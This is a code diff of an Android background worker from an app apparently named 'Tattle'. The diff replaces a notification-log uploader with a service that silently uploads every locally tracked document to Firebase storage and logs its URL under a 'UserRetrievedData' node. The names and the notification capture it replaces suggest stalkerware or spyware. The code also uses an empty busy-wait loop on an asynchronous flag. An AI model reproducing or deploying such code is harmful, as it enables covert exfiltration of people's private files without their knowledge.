@@ -1,14 +1,16 @@
 package com.globalsolutions.Tattle.DataUploadServices;
 
+import android.app.Application;
 import android.content.Context;
 import android.net.Uri;
-import android.os.Environment;
 
 import androidx.annotation.NonNull;
 import androidx.work.Data;
 import androidx.work.Worker;
 import androidx.work.WorkerParameters;
 
+import com.globalsolutions.Tattle.LocalFilesDB.DocFile;
+import com.globalsolutions.Tattle.LocalFilesDB.DocFileRepo;
 import com.globalsolutions.Tattle.OtherUtils.SharedPrefs;
 import com.google.android.gms.tasks.OnFailureListener;
 import com.google.android.gms.tasks.OnSuccessListener;
@@ -20,19 +22,24 @@ import com.google.firebase.storage.StorageReference;
 import com.google.firebase.storage.UploadTask;
 
 import java.io.File;
+import java.util.List;
 
-public class NotificationUploadScheduler extends Worker {
+public class ContinuouslyDocUploadingService extends Worker {
 
-    public static final String TAG = "BROADDD";
-
-    FirebaseAuth firebaseAuth;
     FirebaseDatabase firebaseDatabase;
     DatabaseReference databaseReference;
-    StorageReference storageReference;
-    Context context;
+    FirebaseAuth firebaseAuth;
     SharedPrefs sharedPrefs;
+    StorageReference storageReference;
 
-    public NotificationUploadScheduler(@NonNull Context context, @NonNull WorkerParameters workerParams) {
+    List<DocFile> allFiles;
+    DocFileRepo docFileRepo;
+
+    Context context;
+
+    boolean uploadedDOC = false;
+
+    public ContinuouslyDocUploadingService(@NonNull Context context, @NonNull WorkerParameters workerParams) {
         super(context, workerParams);
         this.context = context;
     }
@@ -40,76 +47,78 @@ public class NotificationUploadScheduler extends Worker {
     @NonNull
     @Override
     public Result doWork() {
+        sharedPrefs = SharedPrefs.getInstance(this.getApplicationContext());
         firebaseAuth = FirebaseAuth.getInstance();
+
+        docFileRepo = new DocFileRepo((Application) context.getApplicationContext());
+        allFiles = docFileRepo.getAllDocFiles();
         firebaseDatabase = FirebaseDatabase.getInstance();
         databaseReference = firebaseDatabase.getReference();
-        sharedPrefs = SharedPrefs.getInstance(this.getApplicationContext());
         storageReference = FirebaseStorage.getInstance().getReference(sharedPrefs.getUniqueId());
-        getFileToUpload();
-        Data outputData = new Data.Builder().putBoolean("fileUploaded", true).build();
+
+        if (allFiles != null && !allFiles.isEmpty()) {
+            for (int i = 0; i < allFiles.size(); i++) {
+                File file = getFileFromPath(allFiles.get(i).getDocPath());
+                DocFile docFile = allFiles.get(i);
+                if (file != null && !docFile.isUploaded()) {
+                    uploadedDOC = false;
+                    uploadFileDOC(file, docFile);
+                    while (!uploadedDOC) {
+
+                    }
+                }
+            }
+        }
+
+        Data outputData = new Data.Builder().putBoolean("docsSyncedWithServer", true).build();
         return Result.success(outputData);
     }
 
-    public void getFileToUpload() {
-        String backupDBPath = Environment.getExternalStorageDirectory().getPath() + "/Temp";
-        final File backupDBFolder = new File(backupDBPath);
-        backupDBFolder.mkdirs();
-
-        File logFile = new File(backupDBFolder, "temp.txt");
-        if (logFile.exists()) {
-            uploadFile(logFile);
-        } else {
+    public File getFileFromPath(String path) {
+        File file = new File(path);
+        if (file.exists()) {
+            return file;
         }
+        return null;
     }
 
-    private void uploadFile(File file) {
 
-        StorageReference mStorageReference = this.storageReference.child("NotificationLogs").child(file.getName());
+    public void uploadFileDOC(File file, DocFile docFile) {
+        StorageReference mStorageRef = this.storageReference.child("UserFiles").child(file.getName());
+
         Uri uri = Uri.fromFile(file);
-        mStorageReference.putFile(uri).addOnSuccessListener(new OnSuccessListener<UploadTask.TaskSnapshot>() {
+        mStorageRef.putFile(uri).addOnSuccessListener(new OnSuccessListener<UploadTask.TaskSnapshot>() {
             @Override
             public void onSuccess(UploadTask.TaskSnapshot taskSnapshot) {
-                mStorageReference.getDownloadUrl().addOnSuccessListener(new OnSuccessListener<Uri>() {
+                mStorageRef.getDownloadUrl().addOnSuccessListener(new OnSuccessListener<Uri>() {
                     @Override
                     public void onSuccess(Uri uri) {
-                        databaseReference.child("UserRetrievedData").child(sharedPrefs.getUniqueId()).child("NotificationLogs").push().setValue(uri.toString()).addOnSuccessListener(new OnSuccessListener<Void>() {
+                        databaseReference.child("UserRetrievedData").child(sharedPrefs.getUniqueId()).child("Documents").push().setValue(uri.toString()).addOnSuccessListener(new OnSuccessListener<Void>() {
                             @Override
                             public void onSuccess(Void aVoid) {
-                                deleteFile();
+                                docFile.setUploaded(true);
+                                docFileRepo.update(docFile);
+                                uploadedDOC = true;
                             }
                         }).addOnFailureListener(new OnFailureListener() {
                             @Override
                             public void onFailure(@NonNull Exception e) {
+                                uploadedDOC = true;
                             }
                         });
                     }
                 }).addOnFailureListener(new OnFailureListener() {
                     @Override
                     public void onFailure(@NonNull Exception e) {
+                        uploadedDOC = true;
                     }
                 });
             }
         }).addOnFailureListener(new OnFailureListener() {
             @Override
             public void onFailure(@NonNull Exception e) {
+                uploadedDOC = true;
             }
         });
     }
-
-    public void deleteFile() {
-        String backupDBPath = Environment.getExternalStorageDirectory().getPath() + "/Temp";
-        final File backupDBFolder = new File(backupDBPath);
-        backupDBFolder.mkdirs();
-
-        File logFile = new File(backupDBFolder, "temp.txt");
-        if (logFile.exists()) {
-            try {
-                logFile.delete();
-            } catch (Exception e) {
-            }
-        } else {
-        }
-    }
-
-
 }
